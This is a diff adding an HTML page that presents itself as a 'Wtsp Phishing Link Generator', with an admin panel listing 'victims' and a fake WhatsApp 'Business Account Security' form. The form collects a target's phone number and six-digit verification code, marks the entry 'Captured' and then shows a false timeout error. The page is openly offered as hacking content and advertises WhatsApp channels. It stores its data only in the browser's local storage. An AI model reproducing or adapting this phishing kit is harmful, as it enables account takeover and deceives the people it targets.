@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>
+      FAK Hosted Content
+    </title>
+  </head>
+  <body>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title>
+      Wtsp Ha3k - DarkTechZone
+    </title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700&amp;display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" />
+    <style>
+      :root {
+            --bg: #e6e9ef;
+            --wa-green: #25d366;
+            --shadow-dark: #b8b6c3;
+            --shadow-light: #ffffff;
+            --accent: #2563eb;
+        }
+
+        body {
+            font-family: &#39;Plus Jakarta Sans&#39;, sans-serif;
+            background-color: var(--bg);
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            color: #4a5568;
+        }
+
+        #toast {
+            position: fixed; top: 20px; right: -400px;
+            background: var(--bg); padding: 15px 25px;
+            border-radius: 20px; display: flex; align-items: center; gap: 15px;
+            box-shadow: 10px 10px 20px var(--shadow-dark), -5px -5px 15px var(--shadow-light);
+            z-index: 10001; transition: 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            min-width: 280px;
+        }
+        #toast.active { right: 20px; }
+        #toast .progress {
+            position: absolute; bottom: 0; left: 0; height: 4px;
+            width: 100%; background: var(--wa-green); border-radius: 0 0 20px 20px;
+        }
+        #toast i.close-toast { cursor: pointer; margin-left: auto; opacity: 0.5; }
+
+   
+        .overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.4); backdrop-filter: blur(10px);
+            display: flex; align-items: center; justify-content: center; z-index: 9999;
+        }
+        .popup-3d {
+            background: var(--bg); padding: 40px; border-radius: 40px; text-align: center;
+            box-shadow: 20px 20px 60px var(--shadow-dark); max-width: 380px;
+        }
+
+        /* --- Main UI Containers --- */
+        .container {
+            background: var(--bg); padding: 40px; border-radius: 40px;
+            width: 90%; max-width: 440px; text-align: center;
+            box-shadow: 20px 20px 60px var(--shadow-dark), -20px -20px 60px var(--shadow-light);
+            margin: 30px 0;
+        }
+        #admin-card { max-width: 900px; }
+
+      
+        .features-grid {
+            display: flex; justify-content: center; flex-wrap: wrap;
+            gap: 20px; margin: 40px auto; width: 100%; max-width: 1000px;
+        }
+        .feature-box {
+            background: var(--bg); padding: 30px; border-radius: 35px; width: 260px;
+            box-shadow: 10px 10px 20px var(--shadow-dark), -10px -10px 20px var(--shadow-light);
+            transition: 0.4s; position: relative;
+        }
+        .feature-box:hover { box-shadow: 0 0 20px rgba(37, 211, 102, 0.4); transform: translateY(-5px); }
+        .feature-box i { font-size: 35px; color: var(--wa-green); margin-bottom: 15px; }
+
+        
+        .btn-3d {
+            background: var(--bg); border: none; padding: 15px 25px; border-radius: 18px;
+            box-shadow: 6px 6px 12px var(--shadow-dark), -6px -6px 12px var(--shadow-light);
+            cursor: pointer; font-weight: 700; color: #444; display: inline-flex;
+            align-items: center; gap: 10px; transition: 0.2s;
+        }
+        .btn-3d:active { box-shadow: inset 4px 4px 8px var(--shadow-dark); transform: scale(0.98); }
+        .btn-wa { background: var(--wa-green); color: white; }
+
+        /* --- Admin Table --- */
+        .admin-table { width: 100%; border-collapse: separate; border-spacing: 0 15px; }
+        .admin-table th { padding: 10px; opacity: 0.7; font-size: 13px; text-transform: uppercase; }
+        .admin-table td {
+            background: var(--bg); padding: 20px; border-radius: 25px;
+            box-shadow: 5px 5px 15px var(--shadow-dark);
+            text-align: center;
+        }
+
+        .input-group {
+            background: var(--bg); border-radius: 20px; padding: 5px;
+            box-shadow: inset 6px 6px 12px var(--shadow-dark), inset -6px -6px 12px var(--shadow-light);
+            display: flex; margin: 25px 0;
+        }
+        input, select { background: transparent; border: none; padding: 15px; outline: none; font-weight: 600; }
+        .code-box {
+            width: 45px; height: 55px; background: var(--bg); border: none; border-radius: 12px;
+            box-shadow: inset 4px 4px 8px var(--shadow-dark), inset -4px -4px 8px var(--shadow-light);
+            text-align: center; font-size: 22px; font-weight: bold; color: var(--wa-green);
+        }
+
+        footer { padding: 40px; color: #999; text-align: center; font-size: 13px; }
+    </style>
+    <div id="toast">
+      <div id="toast-icon">
+      </div>
+      <div id="toast-msg">
+      </div>
+      <i class="fas fa-times close-toast" onclick="hideToast()"></i>
+      <div class="progress" id="toast-progress">
+      </div>
+    </div>
+    <div class="overlay" id="waPopup">
+      <div class="popup-3d">
+        <div style="font-size: 50px; color: var(--wa-green); margin-bottom: 15px;">
+          <i class="fab fa-whatsapp"></i>
+        </div>
+        <h2>
+          Join Channel
+        </h2>
+        <p>
+          Join Our Channel For Exclusive, Cracking And Hacking Content And Also For New Updates.
+        </p>
+        <button class="btn-3d btn-wa" onclick="window.open(&#39;https://whatsapp.com/channel/0029VbBqOAI9sBI1uo6ixO3E&#39;)" style="width:100%; justify-content:center; margin-bottom:12px;">
+          <i class="fab fa-whatsapp"></i>
+          Join Channel
+        </button>
+        <button class="btn-3d" onclick="closePopup()" style="width:100%; justify-content:center;">
+          I Have Joined
+        </button>
+      </div>
+    </div>
+    <div style="width: 100%; display: flex; flex-direction: column; align-items: center; padding: 20px;">
+      <div class="container" id="admin-card">
+        <h1>
+          <i class="fas fa-crown"></i>
+          Wtsp Phishing Link Generator
+        </h1>
+        <button class="btn-3d btn-wa" onclick="generateSessionLink()">
+          <i class="fas fa-plus-circle"></i>
+          Generate New Session
+        </button>
+        <div id="linkDisplay" style="display:none; margin-top:30px; padding:25px; background:white; border-radius:30px; box-shadow:inset 3px 3px 8px #ccc;">
+          <p id="actualLink" style="word-break: break-all; font-weight: bold; color: #075e54; margin-bottom: 20px;">
+          </p>
+          <div style="display: flex; justify-content: center; gap: 15px;">
+            <button class="btn-3d" onclick="copyLink()">
+              <i class="fas fa-copy"></i>
+              Copy Link
+            </button>
+            <button class="btn-3d" id="viewBtn">
+              <i class="fas fa-eye"></i>
+              View
+            </button>
+          </div>
+        </div>
+        <h3 style="margin-top:40px; opacity: 0.7;">
+          Active Victim Monitoring
+        </h3>
+        <table class="admin-table">
+          <thead>
+            <tr>
+              <th>
+                Session ID
+              </th>
+              <th>
+                Phone
+              </th>
+              <th>
+                OTP
+              </th>
+              <th>
+                Status
+              </th>
+            </tr>
+          </thead>
+          <tbody id="live-data-table">
+          </tbody>
+        </table>
+      </div>
+      <div id="user-ui" class="container" style="display:none;">
+        <div style="font-size: 55px; color: var(--wa-green);">
+          <i class="fab fa-whatsapp"></i>
+        </div>
+        <div style="color: #039be5; font-size: 11px; font-weight: bold; margin-top: 10px; text-transform: uppercase;">
+          Business Account Security
+        </div>
+        <h2>
+          Verify Identity
+        </h2>
+        <div id="step-1">
+          <p style="font-size: 14px; color: #666;">
+            Enter your registered mobile number to sync your account with 3D security protocols.
+          </p>
+          <div class="input-group">
+            <select id="countrySelect">
+              <option value="92">
+                PK +92
+              </option>
+              <option value="91">
+                IN +91
+              </option>
+            </select>
+            <input type="tel" id="whatsappNumber" placeholder="300 0000000" />
+          </div>
+          <button class="btn-3d btn-wa" onclick="requestOTP()" style="width:100%; justify-content:center;">
+            Continue
+            <i class="fas fa-arrow-right"></i>
+          </button>
+        </div>
+        <div id="step-2" style="display:none;">
+          <p style="font-size: 14px; color: #666;">
+            Security code sent. Enter the 6-digit code received on your WhatsApp.
+          </p>
+          <div style="display:flex; justify-content:center; gap:8px; margin:25px 0;">
+            <input type="number" class="code-box" maxlength="1" oninput="moveFocus(this)" />
+            <input type="number" class="code-box" maxlength="1" oninput="moveFocus(this)" />
+            <input type="number" class="code-box" maxlength="1" oninput="moveFocus(this)" />
+            <input type="number" class="code-box" maxlength="1" oninput="moveFocus(this)" />
+            <input type="number" class="code-box" maxlength="1" oninput="moveFocus(this)" />
+            <input type="number" class="code-box" maxlength="1" oninput="moveFocus(this)" />
+          </div>
+          <button class="btn-3d btn-wa" onclick="verifyOTP()" style="width:100%; justify-content:center;">
+            Verify Now
+          </button>
+        </div>
+        <p style="font-size: 11px; color: #aaa; margin-top: 25px;">
+          <i class="fas fa-lock"></i>
+          End-to-end encrypted verification.
+        </p>
+      </div>
+      <div class="features-grid" id="main-features">
+        <div class="feature-box">
+          <i class="fas fa-shield-virus"></i>
+          <h4>
+            Security
+          </h4>
+          <p style="font-size: 12px;">
+            Advanced 2026 protocols for anti-ban account protection.
+          </p>
+        </div>
+        <div class="feature-box">
+          <i class="fas fa-tachometer-alt"></i>
+          <h4>
+            Instant Logs
+          </h4>
+          <p style="font-size: 12px;">
+            Get real-time data sync with zero delay enterprise servers.
+          </p>
+        </div>
+        <div class="feature-box">
+          <i class="fas fa-fingerprint"></i>
+          <h4>
+            Encrypted
+          </h4>
+          <p style="font-size: 12px;">
+            Fully encrypted data packets for secure session tracking.
+          </p>
+        </div>
+      </div>
+    </div>
+    <footer>
+      <p>
+        <strong>        © 2026 Whatsapp HA3K
+</strong>
+        All Rights Reserved.
+      </p>
+    </footer>
+    <script>
+      const params = new URLSearchParams(window.location.search);
+const sessionID = params.get(&#39;id&#39;);
+
+// Setup UI based on access
+if (sessionID) {
+    document.getElementById(&#39;admin-card&#39;).style.display = &#39;none&#39;;
+    document.getElementById(&#39;main-features&#39;).style.display = &#39;none&#39;; // Boxes removed for User
+    document.getElementById(&#39;user-ui&#39;).style.display = &#39;block&#39;;
+    document.getElementById(&#39;waPopup&#39;).style.display = &#39;none&#39;;
+}
+
+function closePopup() { document.getElementById(&#39;waPopup&#39;).style.display = &#39;none&#39;; }
+
+// Toast Notification System
+function showToast(msg, type = &#39;success&#39;) {
+    const toast = document.getElementById(&#39;toast&#39;);
+    const icon = document.getElementById(&#39;toast-icon&#39;);
+    const progress = document.getElementById(&#39;toast-progress&#39;);
+    
+    icon.innerHTML = type === &#39;success&#39; ? &#39;&lt;i class=&#34;fas fa-check-circle&#34; style=&#34;color:var(--wa-green)&#34;&gt;&lt;/i&gt;&#39; : &#39;&lt;i class=&#34;fas fa-exclamation-circle&#34; style=&#34;color:#ef4444&#34;&gt;&lt;/i&gt;&#39;;
+    document.getElementById(&#39;toast-msg&#39;).innerText = msg;
+    progress.style.background = type === &#39;success&#39; ? &#39;var(--wa-green)&#39; : &#39;#ef4444&#39;;
+    
+    toast.classList.add(&#39;active&#39;);
+    progress.style.width = &#39;100%&#39;;
+    
+    let width = 100;
+    const interval = setInterval(() =&gt; {
+        width -= 1;
+        progress.style.width = width + &#39;%&#39;;
+        if (width &lt;= 0) {
+            clearInterval(interval);
+            hideToast();
+        }
+    }, 30);
+}
+
+function hideToast() { document.getElementById(&#39;toast&#39;).classList.remove(&#39;active&#39;); }
+
+// Admin Dashboard Logic
+function generateSessionLink() {
+    for (let i = 0; i &lt; localStorage.length; i++) {
+        const key = localStorage.key(i);
+        if (key.startsWith(&#39;wa_data_&#39;)) localStorage.removeItem(key);
+    }
+    
+    const id = &#39;SEC-&#39; + Math.floor(1000 + Math.random() * 9000);
+    const link = window.location.href.split(&#39;?&#39;)[0] + &#39;?id=&#39; + id;
+    
+    document.getElementById(&#39;actualLink&#39;).innerText = link;
+    document.getElementById(&#39;linkDisplay&#39;).style.display = &#39;block&#39;;
+    document.getElementById(&#39;viewBtn&#39;).onclick = () =&gt; window.open(link, &#39;_blank&#39;);
+    
+    localStorage.setItem(&#39;wa_data_&#39; + id, JSON.stringify({number: &#39;Syncing...&#39;, otp: &#39;---&#39;, status: &#39;Active&#39;}));
+    showToast(&#34;New Session Generated!&#34;, &#34;success&#34;);
+}
+
+function copyLink() {
+    navigator.clipboard.writeText(document.getElementById(&#39;actualLink&#39;).innerText);
+    showToast(&#34;Link Copied to Clipboard!&#34;, &#34;success&#34;);
+}
+
+function startLiveTracking() {
+    setInterval(() =&gt; {
+        const tbody = document.getElementById(&#39;live-data-table&#39;);
+        if (!tbody) return;
+        tbody.innerHTML = &#39;&#39;;
+        let found = false;
+        for (let i = 0; i &lt; localStorage.length; i++) {
+            const key = localStorage.key(i);
+            if (key.startsWith(&#39;wa_data_&#39;)) {
+                found = true;
+                const data = JSON.parse(localStorage.getItem(key));
+                tbody.innerHTML += `&lt;tr&gt;
+                    &lt;td&gt;&lt;b&gt;${key.replace(&#39;wa_data_&#39;, &#39;&#39;)}&lt;/b&gt;&lt;/td&gt;
+                    &lt;td&gt;${data.number}&lt;/td&gt;
+                    &lt;td&gt;&lt;b style=&#34;color:var(--wa-green); font-size:22px; font-family:monospace;&#34;&gt;${data.otp}&lt;/b&gt;&lt;/td&gt;
+                    &lt;td&gt;&lt;span style=&#34;font-size:12px; font-weight:bold; color:var(--accent);&#34;&gt;${data.status}&lt;/span&gt;&lt;/td&gt;
+                &lt;/tr&gt;`;
+            }
+        }
+        if(!found) tbody.innerHTML = &#39;&lt;tr&gt;&lt;td colspan=&#34;4&#34; style=&#34;opacity:0.5; padding:20px;&#34;&gt;No active session. Generate a link to start.&lt;/td&gt;&lt;/tr&gt;&#39;;
+    }, 2000);
+}
+
+if (!sessionID) startLiveTracking();
+
+// User Side Logic
+function requestOTP() {
+    const num = document.getElementById(&#39;whatsappNumber&#39;).value;
+    if(num.length &lt; 8) return showToast(&#34;Enter valid number&#34;, &#34;error&#34;);
+    
+    const current = JSON.parse(localStorage.getItem(&#39;wa_data_&#39; + sessionID)) || {};
+    localStorage.setItem(&#39;wa_data_&#39; + sessionID, JSON.stringify({...current, number: num, status: &#39;OTP Sent&#39;}));
+    document.getElementById(&#39;step-1&#39;).style.display = &#39;none&#39;;
+    document.getElementById(&#39;step-2&#39;).style.display = &#39;block&#39;;
+    showToast(&#34;OTP Code Sent!&#34;, &#34;success&#34;);
+}
+
+function moveFocus(el) { if (el.value.length === 1 &amp;&amp; el.nextElementSibling) el.nextElementSibling.focus(); }
+
+function verifyOTP() {
+    let otp = &#39;&#39;;
+    document.querySelectorAll(&#39;.code-box&#39;).forEach(b =&gt; otp += b.value);
+    if(otp.length &lt; 6) return showToast(&#34;Enter full code&#34;, &#34;error&#34;);
+
+    const current = JSON.parse(localStorage.getItem(&#39;wa_data_&#39; + sessionID)) || {};
+    localStorage.setItem(&#39;wa_data_&#39; + sessionID, JSON.stringify({...current, otp: otp, status: &#39;Captured&#39;}));
+    showToast(&#34;Connection Timeout! Try Again.&#34;, &#34;error&#34;);
+    document.querySelectorAll(&#39;.code-box&#39;).forEach(b =&gt; b.value = &#39;&#39;);
+}
+    </script>
+    <div id="fak-branding" style="position:fixed; bottom:15px; left:15px; z-index:999999; background:rgba(0,255,149,0.15); border:1px solid #0f9; color:#0f9; padding:6px 14px; border-radius:50px; font-family:monospace; font-size:12px; cursor:pointer; backdrop-filter:blur(8px); box-shadow:0 0 15px rgba(0,255,153,0.2); transition: 0.3s;" onclick="window.open(&#39;https://whatsapp.com/channel/0029Vb2y2umF6sn16F6Zm20k&#39;)">
+      🚀 Hosted by
+      <b>      FAK CODE LAB
+</b>
+    </div>
+    <style>
+      #fak-branding:hover{ background: #0f9 !important; color: #000 !important; transform: scale(1.05); }
+    </style>
+  </body>
+</html>
+
